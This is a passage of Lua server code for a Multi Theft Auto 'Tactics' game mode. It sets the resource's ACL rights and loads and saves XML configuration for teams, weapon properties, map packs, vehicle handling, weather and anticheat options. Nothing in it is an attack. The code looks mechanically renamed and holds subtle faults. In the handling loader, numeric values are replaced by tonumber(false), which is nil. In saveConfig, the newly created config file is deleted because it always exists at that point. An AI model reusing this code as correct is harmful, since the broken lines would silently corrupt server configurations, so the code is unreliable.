                local permissionSet = aclGetName(aclEntry) == "Admin" and adminPermissionsFull or aclGetName(aclEntry) == "SuperModerator" and superModeratorPermissions or aclGetName(aclEntry) == "Moderator" and moderatorPermissions or noPermissions;
                for permissionKey, permissionValue in pairsFunc1(permissionSet) do
                    if not aclGetRight(aclEntry, "general.tactics_" .. permissionKey) then
                        aclSetRight(aclEntry, "general.tactics_" .. permissionKey, permissionValue);
                    end;
                end;
            end;
            local tacticsACL = aclGet("Tactics") or aclCreate("Tactics");
            local tacticsACLGroup = aclGetGroup("Tactics") or aclCreateGroup("Tactics");
            aclSetRight(tacticsACL, "function.callRemote", true);
            aclSetRight(tacticsACL, "function.getClientIP", true);
            aclSetRight(tacticsACL, "function.kickPlayer", true);
            aclSetRight(tacticsACL, "function.redirectPlayer", true);
            aclSetRight(tacticsACL, "function.restartResource", true);
            aclSetRight(tacticsACL, "function.startResource", true);
            aclSetRight(tacticsACL, "function.stopResource", true);
            aclSetRight(tacticsACL, "general.ModifyOtherObjects", true);
            for permissionName in pairs(adminPermissionsFull) do
                aclSetRight(tacticsACL, "general.tactics_" .. permissionName, true);
            end;
            aclGroupAddACL(tacticsACLGroup, tacticsACL);
            aclGroupAddObject(tacticsACLGroup, "resource." .. getResourceName(resourceElement));
            for _, aclGroupEntry in ipairs(aclGroupList()) do
                if aclGroupEntry ~= tacticsACLGroup then
                    aclGroupRemoveObject(aclGroupEntry, "resource." .. getResourceName(resourceElement));
                    if not hasObjectPermissionTo(resourceElement, "function.aclGroupRemoveObject", false) then
                        break;
                    end;
                end;
            end;
            return;
        end;
    end;
    getConfigs = function() 
        local configsList = {};
        local configsXML = xmlLoadFile("config/configs.xml");
        if not configsXML then
            return configsList;
        else
            for _, configNode in ipairs(xmlNodeGetChildren(configsXML)) do
                if xmlNodeGetName(configNode) == "config" then
                    table.insert(configsList, xmlNodeGetAttribute(configNode, "src"));
                end;
            end;
            xmlUnloadFile(configsXML);
            return configsList;
        end;
    end;
    getCurrentConfig = function() 
        local currentConfig = false;
        if not fileExists("config/configs.xml") then
            return currentConfig;
        else
            local configsFileXML = xmlLoadFile("config/configs.xml");
            for _, configFileNode in ipairs(xmlNodeGetChildren(configsFileXML)) do
                if xmlNodeGetName(configFileNode) == "current" then
                    currentConfig = xmlNodeGetAttribute(configFileNode, "src");
                end;
            end;
            xmlUnloadFile(configsFileXML);
            return currentConfig;
        end;
    end;
    startConfig = function(configName, silentLoad) 
        if not fileExists("config/" .. tostring(configName) .. ".xml") then
            return false;
        else
            local configXML = xmlLoadFile("config/" .. tostring(configName) .. ".xml");
            for _, configSection in ipairs(xmlNodeGetChildren(configXML)) do
                if xmlNodeGetName(configSection) == "teams" then
                    local teamsArray = {};
                    local refereeTeam = {
                        "Referee", 
                        {
                            71
                        }, 
                        {
                            255, 
                            255, 
                            255
                        }
                    };
                    for _, teamNode in ipairs(xmlNodeGetChildren(configSection)) do
                        if xmlNodeGetName(teamNode) == "team" then
                            local teamData = {
                                "", 
                                {
                                    71
                                }, 
                                {
                                    255, 
                                    255, 
                                    255
                                }
                            };
                            for attributeName, attributeValue in pairs(xmlNodeGetAttributes(teamNode)) do
                                if attributeName == "name" then
                                    teamData[1] = attributeValue;
                                end;
                                if attributeName == "skins" then
                                    teamData[2] = {
                                        fromJSON(attributeValue)
                                    };
                                end;
                                if attributeName == "color" then
                                    teamData[3] = {
                                        fromJSON(attributeValue)
                                    };
                                end;
                                if attributeName == "side" then
                                    teamData[4] = attributeValue;
                                end;
                            end;
                            table.insert(teamsArray, teamData);
                        end;
                        if xmlNodeGetName(teamNode) == "referee" then
                            for refAttributeName, refAttributeValue in pairs(xmlNodeGetAttributes(teamNode)) do
                                if refAttributeName == "name" then
                                    refereeTeam[1] = refAttributeValue;
                                end;
                                if refAttributeName == "skins" then
                                    refereeTeam[2] = {
                                        fromJSON(refAttributeValue)
                                    };
                                end;
                                if refAttributeName == "color" then
                                    refereeTeam[3] = {
                                        fromJSON(refAttributeValue)
                                    };
                                end;
                            end;
                        end;
                    end;
                    table.insert(teamsArray, 1, refereeTeam);
                    local existingTeams = getElementsByType("team");
                    if #existingTeams > #teamsArray then
                        for teamCounter, teamElement2 in ipairs(existingTeams) do
                            if teamCounter <= #teamsArray then
                                local newTeamName = teamsArray[teamCounter][1];
                                local newTeamColor = teamsArray[teamCounter][3];
                                if teamCounter > 1 then
                                    local teamSide = teamsArray[teamCounter][4];
                                    local teamSkinsData = teamsArray[teamCounter][2];
                                    setElementData(teamElement2, "Side", tonumber(teamSide));
                                    setElementData(teamElement2, "Skins", teamSkinsData);
                                end;
                                setTeamName(teamElement2, newTeamName);
                                setTeamColor(teamElement2, newTeamColor[1], newTeamColor[2], newTeamColor[3]);
                            else
                                removeServerTeam(teamElement2);
                            end;
                        end;
                    else
                        local vehicleColorSetting = getTacticsData("settings", "vehicle_color");
                        for newTeamIndex, newTeamConfig in ipairs(teamsArray) do
                            if newTeamIndex <= #existingTeams then
                                local teamNameToSet = newTeamConfig[1];
                                local teamColorToSet = newTeamConfig[3];
                                if newTeamIndex > 1 then
                                    local sideToSet = newTeamConfig[4];
                                    local skinsToSet = newTeamConfig[2];
                                    setElementData(existingTeams[newTeamIndex], "Side", tonumber(sideToSet));
                                    setElementData(existingTeams[newTeamIndex], "Skins", skinsToSet);
                                end;
                                setTeamName(existingTeams[newTeamIndex], teamNameToSet);
                                setTeamColor(existingTeams[newTeamIndex], teamColorToSet[1], teamColorToSet[2], teamColorToSet[3]);
                                for _, playerInTeam in ipairs(getPlayersInTeam(existingTeams[newTeamIndex])) do
                                    triggerClientEvent(root, "onClientPlayerBlipUpdate", playerInTeam);
                                    if getPedOccupiedVehicleSeat(playerInTeam) == 0 and vehicleColorSetting == "teamcolor" then
                                        setVehicleColor(getPedOccupiedVehicle(playerInTeam), teamColorToSet[1], teamColorToSet[2], teamColorToSet[3], 0, 0, 0);
                                    end;
                                end;
                            else
                                local teamNameParam, teamSkinsParam, teamColorParam = unpack(newTeamConfig);
                                addServerTeam(teamNameParam, teamSkinsParam, teamColorParam);
                            end;
                        end;
                    end;
                elseif xmlNodeGetName(configSection) == "weaponpack" then
                    local weaponSlots = xmlNodeGetAttribute(configSection, "slots");
                    setTacticsData(tonumber(weaponSlots) or 0, "weapon_slots");
                    for _, weaponNode in ipairs(xmlNodeGetChildren(configSection)) do
                        if xmlNodeGetName(weaponNode) == "weapons" then
                            setTacticsData(xmlNodeGetAttributes(weaponNode) or {}, "weaponspack");
                        elseif xmlNodeGetName(weaponNode) == "balance" then
                            setTacticsData(xmlNodeGetAttributes(weaponNode) or {}, "weapon_balance");
                        elseif xmlNodeGetName(weaponNode) == "cost" then
                            setTacticsData(xmlNodeGetAttributes(weaponNode) or {}, "weapon_cost");
                        elseif xmlNodeGetName(weaponNode) == "slot" then
                            setTacticsData(xmlNodeGetAttributes(weaponNode) or {}, "weapon_slot");
                        end;
                    end;
                elseif xmlNodeGetName(configSection) == "shooting" then
                    local weaponPropertiesData = {};
                    for _, propertyNode in ipairs(xmlNodeGetChildren(configSection)) do
                        if xmlNodeGetName(propertyNode) == "properties" then
                            local weaponIDAttr = xmlNodeGetAttribute(propertyNode, "weapon");
                            if weaponIDAttr then
                                weaponPropertiesData[tonumber(weaponIDAttr)] = xmlNodeGetAttributes(propertyNode) or {};
                            end;
                        end;
                    end;
                    for _, weaponIDLoop in ipairs(weaponIDs) do
                        for _, propertyName in ipairs(weaponProperties) do
                            local propertyValue = getOriginalWeaponProperty(weaponIDLoop, "pro", propertyName);
                            if weaponPropertiesData[weaponIDLoop] and weaponPropertiesData[weaponIDLoop][propertyName] then
                                propertyValue = tonumber(weaponPropertiesData[weaponIDLoop][propertyName]) or weaponPropertiesData[weaponIDLoop][propertyName];
                                if propertyName == "damage" then
                                    propertyValue = propertyValue * 3;
                                end;
                            elseif propertyName == "flags" then
                                propertyValue = string.reverse(string.format("%04X", propertyValue));
                            end;
                            if propertyName == "flags" then
                                local propertyValueStr = propertyValue;
                                local currentFlags = string.reverse(string.format("%04X", getWeaponProperty(weaponIDLoop, "pro", "flags")));
                                local flagBits = {
                                    {}, 
                                    {}, 
                                    {}, 
                                    {}, 
                                    {}
                                };
                                for flagGroup = 1, 4 do
                                    local hexValue = tonumber(string.sub(propertyValueStr, flagGroup, flagGroup), 16);
                                    if hexValue then
                                        for bitPosition = 3, 0, -1 do
                                            local bitValue = 2 ^ bitPosition;
                                            if bitValue <= hexValue then
                                                flagBits[flagGroup][bitValue] = true;
                                                hexValue = hexValue - bitValue;
                                            else
                                                flagBits[flagGroup][bitValue] = false;
                                            end;
                                        end;
                                    else
                                        flagBits[flagGroup][1] = false;
                                        flagBits[flagGroup][2] = false;
                                        flagBits[flagGroup][4] = false;
                                        flagBits[flagGroup][8] = false;
                                    end;
                                end;
                                for flagGroupIndex = 1, 4 do
                                    local currentHex = tonumber(string.sub(currentFlags, flagGroupIndex, flagGroupIndex), 16);
                                    if currentHex then
                                        for bitPos = 3, 0, -1 do
                                            local bitMask = 2 ^ bitPos;
                                            if bitMask <= currentHex then
                                                if not flagBits[flagGroupIndex][bitMask] then
                                                    setWeaponProperty(weaponIDLoop, "pro", "flags", tonumber("0x" .. string.rep("0", 6 - flagGroupIndex) .. tostring(bitMask) .. string.rep("0", flagGroupIndex - 1)));
                                                end;
                                                currentHex = currentHex - bitMask;
                                            elseif flagBits[flagGroupIndex][bitMask] then
                                                setWeaponProperty(weaponIDLoop, "pro", "flags", tonumber("0x" .. string.rep("0", 6 - flagGroupIndex) .. tostring(bitMask) .. string.rep("0", flagGroupIndex - 1)));
                                            end;
                                        end;
                                    else
                                        if flagBits[flagGroupIndex][8] then
                                            setWeaponProperty(weaponIDLoop, "pro", "flags", tonumber("0x" .. string.rep("0", 6 - flagGroupIndex) .. "8" .. string.rep("0", flagGroupIndex - 1)));
                                        end;
                                        if flagBits[flagGroupIndex][4] then
                                            setWeaponProperty(weaponIDLoop, "pro", "flags", tonumber("0x" .. string.rep("0", 6 - flagGroupIndex) .. "4" .. string.rep("0", flagGroupIndex - 1)));
                                        end;
                                        if flagBits[flagGroupIndex][2] then
                                            setWeaponProperty(weaponIDLoop, "pro", "flags", tonumber("0x" .. string.rep("0", 6 - flagGroupIndex) .. "2" .. string.rep("0", flagGroupIndex - 1)));
                                        end;
                                        if flagBits[flagGroupIndex][1] then
                                            setWeaponProperty(weaponIDLoop, "pro", "flags", tonumber("0x" .. string.rep("0", 6 - flagGroupIndex) .. "1" .. string.rep("0", flagGroupIndex - 1)));
                                        end;
                                    end;
                                end;
                            elseif propertyName ~= "weapon" then
                                setWeaponProperty(weaponIDLoop, "pro", propertyName, propertyValue);
                            end;
                        end;
                    end;
                elseif xmlNodeGetName(configSection) == "settings" then
                    for _, settingNode in ipairs(xmlNodeGetChildren(configSection)) do
                        if xmlNodeGetName(settingNode) == "mode" then
                            local modeAttributes = xmlNodeGetAttributes(settingNode);
                            for modeAttributeKey, modeAttributeValue in pairs(modeAttributes) do
                                if modeAttributeKey ~= "name" and (configName == "_default" or getTacticsData("modes", modeAttributes.name, modeAttributeKey) ~= nil and getDataType(modeAttributeValue) == getDataType(getTacticsData("modes", modeAttributes.name, modeAttributeKey, false))) then
                                    setTacticsData(modeAttributeValue, "modes", modeAttributes.name, modeAttributeKey);
                                end;
                            end;
                        end;
                        if xmlNodeGetName(settingNode) == "settings" then
                            for settingKey, settingValue in pairs(xmlNodeGetAttributes(settingNode)) do
                                if configName == "_default" or getTacticsData("settings", settingKey) ~= nil and getDataType(settingValue) == getDataType(getTacticsData("settings", settingKey, false)) then
                                    setTacticsData(settingValue, "settings", settingKey);
                                end;
                            end;
                        end;
                        if xmlNodeGetName(settingNode) == "glitches" then
                            for glitchKey, glitchValue in pairs(xmlNodeGetAttributes(settingNode)) do
                                if configName == "_default" or getTacticsData("glitches", glitchKey) ~= nil and getDataType(glitchValue) == getDataType(getTacticsData("glitches", glitchKey, false)) then
                                    setTacticsData(glitchValue, "glitches", glitchKey);
                                end;
                            end;
                        end;
                        if xmlNodeGetName(settingNode) == "cheats" then
                            for cheatKey, cheatValue in pairs(xmlNodeGetAttributes(settingNode)) do
                                if configName == "_default" or getTacticsData("cheats", cheatKey) ~= nil and getDataType(cheatValue) == getDataType(getTacticsData("cheats", cheatKey, false)) then
                                    setTacticsData(cheatValue, "cheats", cheatKey);
                                end;
                            end;
                        end;
                        if xmlNodeGetName(settingNode) == "limites" then
                            for limitKey, limitValue in pairs(xmlNodeGetAttributes(settingNode)) do
                                if configName == "_default" or getTacticsData("limites", limitKey) ~= nil and getDataType(limitValue) == getDataType(getTacticsData("limites", limitKey, false)) then
                                    setTacticsData(limitValue, "limites", limitKey);
                                end;
                            end;
                        end;
                    end;
                elseif xmlNodeGetName(configSection) == "mappack" then
                    local automaticsMode = xmlNodeGetAttribute(configSection, "automatics");
                    if automaticsMode then
                        setTacticsData(automaticsMode, "automatics");
                    end;
                    for _, mapPackNode in ipairs(xmlNodeGetChildren(configSection)) do
                        if xmlNodeGetName(mapPackNode) == "cycler" then
                            local cyclerResources = xmlNodeGetAttribute(mapPackNode, "resnames");
                            local resourcesArray = {
                                fromJSON(cyclerResources)
                            };
                            local filteredMaps = {};
                            for _, mapResourceName in ipairs(resourcesArray) do
                                local mapResourceElement = getResourceFromName(tostring(mapResourceName));
                                if mapResourceElement and getResourceInfo(mapResourceElement, "type") == "map" then
                                    for modePatternKey, modePatternValue in pairs(getTacticsData("modes_defined")) do
                                        if string.find(mapResourceName, modePatternKey) == 1 then
                                            local mapElementsData = {};
                                            if type(modePatternValue) == "function" then
                                                local mapMetaXML = xmlLoadFile(":" .. mapResourceName .. "/meta.xml");
                                                if mapMetaXML then
                                                    for _, mapMetaNode in ipairs(xmlNodeGetChildren(mapMetaXML)) do
                                                        if xmlNodeGetName(mapMetaNode) == "map" then
                                                            local mapDataXML = xmlLoadFile(":" .. mapResourceName .. "/" .. xmlNodeGetAttribute(mapMetaNode, "src"));
                                                            if mapDataXML then
                                                                for _, mapDataNode in ipairs(xmlNodeGetChildren(mapDataXML)) do
                                                                    local mapElementType = xmlNodeGetName(mapDataNode);
                                                                    if not mapElementsData[mapElementType] then
                                                                        mapElementsData[mapElementType] = {};
                                                                    end;
                                                                    table.insert(mapElementsData[mapElementType], xmlNodeGetAttributes(mapDataNode));
                                                                end;
                                                                xmlUnloadFile(mapDataXML);
                                                            end;
                                                        end;
                                                    end;
                                                    xmlUnloadFile(mapMetaXML);
                                                end;
                                            end;
                                            if type(modePatternValue) ~= "function" or modePatternValue(mapElementsData) == true then
                                                local resourceDisplayName = getResourceInfo(mapResourceElement, "name");
                                                if not resourceDisplayName then
                                                    resourceDisplayName = string.sub(string.gsub(mapResourceName, "_", " "), #modePatternKey + 2);
                                                    if #resourceDisplayName > 1 then
                                                        resourceDisplayName = string.upper(string.sub(resourceDisplayName, 1, 1)) .. string.sub(resourceDisplayName, 2);
                                                    end;
                                                end;
                                                local modeDisplayName = string.upper(string.sub(modePatternKey, 1, 1)) .. string.sub(modePatternKey, 2);
                                                local resourceAuthor = getResourceInfo(mapResourceElement, "author") or "";
                                                table.insert(filteredMaps, {
                                                    mapResourceName, 
                                                    modeDisplayName, 
                                                    resourceDisplayName, 
                                                    resourceAuthor
                                                });
                                                break;
                                            else
                                                break;
                                            end;
                                        end;
                                    end;
                                else
                                    for modeKeyCheck2, _ in pairs(getTacticsData("modes_defined")) do
                                        if mapResourceName == modeKeyCheck2 then
                                            table.insert(filteredMaps, {
                                                mapResourceName, 
                                                string.upper(string.sub(mapResourceName, 1, 1)) .. string.sub(mapResourceName, 2), 
                                                "Random"
                                            });
                                            break;
                                        end;
                                    end;
                                end;
                            end;
                            setTacticsData(filteredMaps, "Resources");
                        end;
                        if xmlNodeGetName(mapPackNode) == "disabled" then
                            local disabledResources = xmlNodeGetAttribute(mapPackNode, "resnames");
                            local disabledMapTable = {};
                            for _, disabledMapName in ipairs({
                                fromJSON(disabledResources)
                            }) do
                                disabledMapTable[disabledMapName] = true;
                            end;
                            setTacticsData(disabledMapTable, "map_disabled");
                        end;
                    end;
                elseif xmlNodeGetName(configSection) == "vehiclepack" then
                    local vehicleModels = xmlNodeGetAttribute(configSection, "models");
                    local disabledVehicles = {};
                    for _, vehicleModelID in ipairs({
                        fromJSON(vehicleModels)
                    }) do
                        disabledVehicles[vehicleModelID] = true;
                    end;
                    setTacticsData(disabledVehicles, "disabled_vehicles");
                elseif xmlNodeGetName(configSection) == "handlings" then
                    local handlingData = {};
                    for _, handlingNode in ipairs(xmlNodeGetChildren(configSection)) do
                        if xmlNodeGetName(handlingNode) == "handling" then
                            local vehicleModel = tonumber(xmlNodeGetAttribute(handlingNode, "model"));
                            if vehicleModel then
                                handlingData[vehicleModel] = {};
                                local pairsFunc2 = pairs;
                                local handlingAttributes = xmlNodeGetAttributes(handlingNode) or {};
                                for handlingKeyName, handlingKeyValue in pairsFunc2(handlingAttributes) do
                                    if handlingKeyName == "centerOfMass" then
                                        handlingData[vehicleModel][handlingKeyName] = {
                                            fromJSON(handlingKeyValue)
                                        };
                                    elseif handlingKeyName == "modelFlags" or handlingKeyName == "handlingFlags" then
                                        handlingData[vehicleModel][handlingKeyName] = "0x" .. string.reverse(handlingKeyValue);
                                    elseif handlingKeyName == "sirens" then
                                        local sirenDataArray = {
                                            fromJSON(xmlNodeGetAttribute(handlingNode, "sirens"))
                                        };
                                        handlingData[vehicleModel][handlingKeyName] = {
                                            count = tonumber(sirenDataArray[1]), 
                                            type = tonumber(sirenDataArray[2]), 
                                            flags = {
                                                ["360"] = sirenDataArray[3] == 1, 
                                                DoLOSCheck = sirenDataArray[4] == 1, 
                                                UseRandomiser = sirenDataArray[5] == 1, 
                                                Silent = sirenDataArray[6] == 1
                                            }
                                        };
                                        for sirenIndex2 = 1, tonumber(sirenDataArray[1]) do
                                            handlingData[vehicleModel][handlingKeyName][sirenIndex2] = {
                                                x = tonumber(sirenDataArray[2 + sirenIndex2 * 5]), 
                                                y = tonumber(sirenDataArray[3 + sirenIndex2 * 5]), 
                                                z = tonumber(sirenDataArray[4 + sirenIndex2 * 5]), 
                                                color = tostring(sirenDataArray[5 + sirenIndex2 * 5]), 
                                                minalpha = tonumber(sirenDataArray[6 + sirenIndex2 * 5])
                                            };
                                        end;
                                    elseif tonumber(handlingKeyValue) then
                                        handlingData[vehicleModel][handlingKeyName] = tonumber(false);
                                    elseif handlingKeyValue == "true" then
                                        handlingData[vehicleModel][handlingKeyName] = true;
                                    elseif handlingKeyValue == "false" then
                                        handlingData[vehicleModel][handlingKeyName] = false;
                                    else
                                        handlingData[vehicleModel][handlingKeyName] = handlingKeyValue;
                                    end;
                                end;
                            end;
                        end;
                    end;
                    setTacticsData(handlingData, "handlings");
                elseif xmlNodeGetName(configSection) == "weather" then
                    local weatherData = {};
                    for _, weatherNode in ipairs(xmlNodeGetChildren(configSection)) do
                        if xmlNodeGetName(weatherNode) == "weather" then
                            local weatherHour = tonumber(xmlNodeGetAttribute(weatherNode, "hour"));
                            local sunSizeX, sunSizeY, sunSizeZ, sunCoreR, sunCoreG, sunCoreB, sunCoronaSize = fromJSON(xmlNodeGetAttribute(weatherNode, "sun"));
                            local waterR, waterG, waterB, waterA = fromJSON(xmlNodeGetAttribute(weatherNode, "water"));
                            local hasClouds = xmlNodeGetAttribute(weatherNode, "clouds") == "true";
                            local hasBirds = xmlNodeGetAttribute(weatherNode, "birds") == "true";
                            weatherData[weatherHour] = {
                                wind = {
                                    fromJSON(xmlNodeGetAttribute(weatherNode, "wind"))
                                }, 
                                rain = tonumber(xmlNodeGetAttribute(weatherNode, "rain")), 
                                far = tonumber(xmlNodeGetAttribute(weatherNode, "far")), 
                                fog = tonumber(xmlNodeGetAttribute(weatherNode, "fog")), 
                                sky = {
                                    fromJSON(xmlNodeGetAttribute(weatherNode, "sky"))
                                }, 
                                clouds = hasClouds, 
                                birds = hasBirds, 
                                sun = {
                                    sunSizeX, 
                                    sunSizeY, 
                                    sunSizeZ, 
                                    sunCoreR, 
                                    sunCoreG, 
                                    sunCoreB
                                }, 
                                sunsize = tonumber(sunCoronaSize), 
                                water = {
                                    waterR, 
                                    waterG, 
                                    waterB, 
                                    waterA
                                }, 
                                wave = tonumber(xmlNodeGetAttribute(weatherNode, "wave")), 
                                level = tonumber(xmlNodeGetAttribute(weatherNode, "level")), 
                                heat = tonumber(xmlNodeGetAttribute(weatherNode, "heat")), 
                                effect = tonumber(xmlNodeGetAttribute(weatherNode, "effect"))
                            };
                        end;
                    end;
                    setTacticsData(weatherData, "Weather");
                elseif xmlNodeGetName(configSection) == "anticheat" then
                    setTacticsData(xmlNodeGetAttribute(configSection, "action_detection"), "anticheat", "action_detection");
                    for _, anticheatNode in ipairs(xmlNodeGetChildren(configSection)) do
                        if xmlNodeGetName(anticheatNode) == "speedhach" then
                            setTacticsData(xmlNodeGetAttribute(anticheatNode, "enable"), "anticheat", "speedhach");
                        elseif xmlNodeGetName(anticheatNode) == "godmode" then
                            setTacticsData(xmlNodeGetAttribute(anticheatNode, "enable"), "anticheat", "godmode");
                        elseif xmlNodeGetName(anticheatNode) == "mods" then
                            setTacticsData(xmlNodeGetAttribute(anticheatNode, "enable"), "anticheat", "mods");
                            local modsList = {};
                            for _, modNode in ipairs(xmlNodeGetChildren(anticheatNode)) do
                                table.insert(modsList, {
                                    name = xmlNodeGetAttribute(modNode, "name"), 
                                    type = xmlNodeGetAttribute(modNode, "type"), 
                                    search = xmlNodeGetAttribute(modNode, "search")
                                });
                            end;
                            setTacticsData(modsList, "anticheat", "modslist");
                        end;
                    end;
                end;
            end;
            xmlUnloadFile(configXML);
            local _ = {};
            configXML = xmlLoadFile("config/configs.xml");
            for _, configFileNode2 in ipairs(xmlNodeGetChildren(configXML)) do
                if xmlNodeGetName(configFileNode2) == "current" then
                    xmlNodeSetAttribute(configFileNode2, "src", configName);
                end;
            end;
            xmlSaveFile(configXML);
            xmlUnloadFile(configXML);
            if not silentLoad then
                refreshConfiglist(root);
                callClientFunction(root, "refreshTeamConfig");
                callClientFunction(root, "refreshWeaponProperties");
                outputLangString(root, "config_loaded", configName);
            end;
            return true;
        end;
    end;
    saveConfig = function(configToSave, _, saveOptions) 
        local saveXML = xmlCreateFile("config/" .. tostring(configToSave) .. ".xml", "config");
        if not saveXML then
            return false;
        else
            if fileExists("config/" .. tostring(configToSave) .. ".xml") then
                fileDelete("config/" .. tostring(configToSave) .. ".xml");
            else
                local configsFileXML2 = xmlLoadFile("config/configs.xml");
                if not configsFileXML2 then
                    fileDelete("config/" .. tostring(configToSave) .. ".xml");
                    return false;
                else
                    local newConfigNode = xmlCreateChild(configsFileXML2, "config");
                    xmlNodeSetAttribute(newConfigNode, "src", tostring(configToSave));
                    xmlSaveFile(configsFileXML2);
                    xmlUnloadFile(configsFileXML2);
                end;
            end;
            if saveOptions.Maps then
                local mapPackNode2 = xmlCreateChild(saveXML, "mappack");
                xmlNodeSetAttribute(mapPackNode2, "automatics", getTacticsData("automatics", false));
                local cyclerNode = xmlCreateChild(mapPackNode2, "cycler");
                local resnamesString = "";
                for resourceIndex, resourceInfo in ipairs(getTacticsData("Resources", false)) do
                    if resourceIndex > 1 then
                        resnamesString = resnamesString .. ",'" .. tostring(resourceInfo[1]) .. "'";
                    else
                        resnamesString = "'" .. tostring(resourceInfo[1]) .. "'";
                    end;
                end;
                xmlNodeSetAttribute(cyclerNode, "resnames", "[" .. resnamesString .. "]");
                cyclerNode = xmlCreateChild(mapPackNode2, "disabled");
                resnamesString = "";
                for disabledMapName2 in pairs(getTacticsData("map_disabled", false)) do
                    if #resnamesString > 0 then
                        resnamesString = resnamesString .. ",'" .. tostring(disabledMapName2) .. "'";
                    else
                        resnamesString = "'" .. tostring(disabledMapName2) .. "'";
                    end;
                end;
                xmlNodeSetAttribute(cyclerNode, "resnames", "[" .. resnamesString .. "]");
            end;
            if saveOptions.Settings then
                local settingsNode = xmlCreateChild(saveXML, "settings");
                local pairsFunc3 = pairs;
                local modesData = getTacticsData("modes", false) or {};
                for modeNameKey, modeData in pairsFunc3(modesData) do
                    local modeNode = xmlCreateChild(settingsNode, "mode");
                    xmlNodeSetAttribute(modeNode, "name", modeNameKey);
                    for modeSettingKey, modeSettingValue in pairs(modeData) do
                        xmlNodeSetAttribute(modeNode, modeSettingKey, modeSettingValue);
                    end;
                end;
                pairsFunc3 = xmlCreateChild(settingsNode, "settings");
                for settingKeyName, settingKeyValue in pairs(getTacticsData("settings", false)) do
                    xmlNodeSetAttribute(pairsFunc3, settingKeyName, tostring(settingKeyValue));
                end;
                modesData = xmlCreateChild(settingsNode, "glitches");
                for glitchKeyName, glitchKeyValue in pairs(getTacticsData("glitches", false)) do
                    xmlNodeSetAttribute(modesData, glitchKeyName, tostring(glitchKeyValue));
                end;
                local cheatsNode = xmlCreateChild(settingsNode, "cheats");
                for cheatKeyName, cheatKeyValue in pairs(getTacticsData("cheats", false)) do
                    xmlNodeSetAttribute(cheatsNode, cheatKeyName, tostring(cheatKeyValue));
                end;
                local limitsNode = xmlCreateChild(settingsNode, "limites");
                for limitKeyName, limitKeyValue in pairs(getTacticsData("limites", false)) do
                    xmlNodeSetAttribute(limitsNode, limitKeyName, tostring(limitKeyValue));
                end;
            end;
            if saveOptions.Teams then
                local teamsNode = xmlCreateChild(saveXML, "teams");
                local allTeams = getElementsByType("team");
                for teamIdx, teamElement3 in ipairs(allTeams) do
                    if teamIdx > 1 then
                        local teamNode2 = xmlCreateChild(teamsNode, "team");
                        xmlNodeSetAttribute(teamNode2, "side", tostring(getElementData(teamElement3, "Side")));
                        xmlNodeSetAttribute(teamNode2, "name", getTeamName(teamElement3));
                        local skinsString = "";
                        for skinIndex, skinID in ipairs(getElementData(teamElement3, "Skins")) do
                            if skinIndex > 1 then
                                skinsString = skinsString .. "," .. tostring(skinID);
                            else
                                skinsString = tostring(skinID);
                            end;
                        end;
                        xmlNodeSetAttribute(teamNode2, "skins", "[" .. skinsString .. "]");
                        local teamColorR2, teamColorG2, teamColorB2 = getTeamColor(teamElement3);
                        xmlNodeSetAttribute(teamNode2, "color", "[" .. teamColorR2 .. "," .. teamColorG2 .. "," .. teamColorB2 .. "]");
                    else
                        local refereeNode = xmlCreateChild(teamsNode, "referee");
                        xmlNodeSetAttribute(refereeNode, "name", getTeamName(teamElement3));
                        local refColorR, refColorG, refColorB = getTeamColor(teamElement3);
                        xmlNodeSetAttribute(refereeNode, "color", "[" .. refColorR .. "," .. refColorG .. "," .. refColorB .. "]");
                    end;
                end;
            end;
            if saveOptions.Weapons then
                local weaponpackNode = xmlCreateChild(saveXML, "weaponpack");
                xmlNodeSetAttribute(weaponpackNode, "slots", tostring(getTacticsData("weapon_slots")) or "0");
                weaponChildNode = xmlCreateChild(weaponpackNode, "weapons");
                local pairsFunc4 = pairs;
                local weaponsData = getTacticsData("weaponspack", false) or {};
                for weaponName, weaponValue in pairsFunc4(weaponsData) do
                    xmlNodeSetAttribute(weaponChildNode, weaponName, tostring(weaponValue));
                end;
                weaponChildNode = xmlCreateChild(weaponpackNode, "balance");
                pairsFunc4 = pairs;
                weaponsData = getTacticsData("weapon_balance", false) or {};
                for balanceKey, balanceValue in pairsFunc4(weaponsData) do
                    xmlNodeSetAttribute(weaponChildNode, balanceKey, tostring(balanceValue));
                end;
                weaponChildNode = xmlCreateChild(weaponpackNode, "cost");
                pairsFunc4 = pairs;
                weaponsData = getTacticsData("weapon_cost", false) or {};
                for costKey, costValue in pairsFunc4(weaponsData) do
                    xmlNodeSetAttribute(weaponChildNode, costKey, tostring(costValue));
                end;
                weaponChildNode = xmlCreateChild(weaponpackNode, "slot");
                pairsFunc4 = pairs;
                weaponsData = getTacticsData("weapon_slot", false) or {};
                for slotKey, slotValue in pairsFunc4(weaponsData) do
                    xmlNodeSetAttribute(weaponChildNode, slotKey, tostring(slotValue));
                end;
            end;
            if saveOptions.Shooting then
                local shootingNode = xmlCreateChild(saveXML, "shooting");
                for _, weaponID2 in ipairs(weaponIDs) do
                    local changedProperties = {};
                    for _, propertyName2 in ipairs(weaponProperties) do
                        local currentPropertyValue = getWeaponProperty(weaponID2, "pro", propertyName2);
                        local originalPropertyValue = getOriginalWeaponProperty(weaponID2, "pro", propertyName2);
                        if propertyName2 == "flags" and currentPropertyValue ~= originalPropertyValue then
                            table.insert(changedProperties, {
                                propertyName2, 
                                string.reverse(string.format("%04X", currentPropertyValue))
                            });
                        elseif string.format("%.4f", currentPropertyValue) ~= string.format("%.4f", originalPropertyValue) then
                            if propertyName2 == "damage" then
                                table.insert(changedProperties, {
                                    propertyName2, 
                                    currentPropertyValue / 3
                                });
                            else
                                table.insert(changedProperties, {
                                    propertyName2, 
                                    currentPropertyValue
                                });
                            end;
                        end;
                    end;
                    if #changedProperties > 0 then
                        local propertiesNode = xmlCreateChild(shootingNode, "properties");
                        xmlNodeSetAttribute(propertiesNode, "weapon", tostring(weaponID2));
                        for _, propertyEntry in ipairs(changedProperties) do
                            xmlNodeSetAttribute(propertiesNode, propertyEntry[1], tostring(propertyEntry[2]));
                        end;
                    end;
                end;
            end;
            if saveOptions.Vehicles then
                local vehiclepackNode = xmlCreateChild(saveXML, "vehiclepack");
                local modelsString = "";
                local disabledVehiclesTable = getTacticsData("disabled_vehicles", false) or {};
                for modelKey, modelValue in pairs(disabledVehiclesTable) do
                    if modelValue == true then
                        if #modelsString > 0 then
                            modelsString = modelsString .. "," .. tostring(modelKey);
                        else
                            modelsString = tostring(modelKey);
                        end;
                    end;
                end;
                xmlNodeSetAttribute(vehiclepackNode, "models", "[" .. modelsString .. "]");
            end;
            if saveOptions.Handling then
                local handlingsNode = xmlCreateChild(saveXML, "handlings");
